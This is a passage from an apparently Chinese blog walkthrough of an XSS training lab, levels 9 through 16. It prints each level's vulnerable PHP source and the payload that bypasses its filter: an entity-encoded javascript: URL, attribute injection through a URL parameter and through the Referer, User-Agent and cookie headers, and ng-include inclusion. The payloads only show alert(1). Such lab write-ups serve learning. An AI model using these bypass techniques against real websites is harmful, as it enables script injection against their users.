class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们发现需要在输入中携带http://</span><br><span class="line"></span><br><span class="line">那么我们可以尝试把http://部分放在js伪协议后面使js且能绕过,但需要和前面部分进行隔断</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>//http://</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>这关通过看网页源代码有发现隐藏的表单部分,并且通过尝试发现依旧过滤了一些符号,可以先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>不难发现我们要传t_sort变量使输入的值会出现在第三个input部分,但是尖括号被过滤我们无法闭合input标签</p><p>那么我们可以尝试注释掉后半部分的hidden类型,并且注入一个新的text类型,即这样的一个过程:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;&#x27; &#x27;&quot;</span>onclick=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>) type=<span class="string">&quot;text&quot;</span> <span class="comment">//&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>则payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=<span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>这样输入框就展现出来了,点击输入框后成功执行js语句,完成此关</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>类似于上一道,依旧有隐藏的表单部分,先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>经过搜索,发现&amp;_SERVE接收的是上个网页的url,并且接收的是请求头部分的Referer内容</p><p>那么我们可以在Referer部分构造和上关一样的payload尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>成功,进入下一关</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>还是直接来看下源码吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>和上题形式一样,只不过$_SERVER部分由User-Agent部分接收值了</p><p>那就在此部分构造同意的payload尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>没什么问题,通过</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>发现又是差不多类型的题,还是先看看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这次是要求在cookie部分传参了,依旧尝试之前的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: user=<span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>没啥好说的,成功</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>本关来源网站g了,直接看下一关</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>进去后发现网站用get请求传了个src参数,先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么发现主要的问题就出在”ng-include”这里,通过搜索发现就是一个简单的文件包含作用</p><p>这时我们可以尝试引用其他关,并利用其他关的漏洞执行js代码通过本关,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(1)&quot;&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>这样我们点击超链接就能通过了</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>没发现什么,看看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span 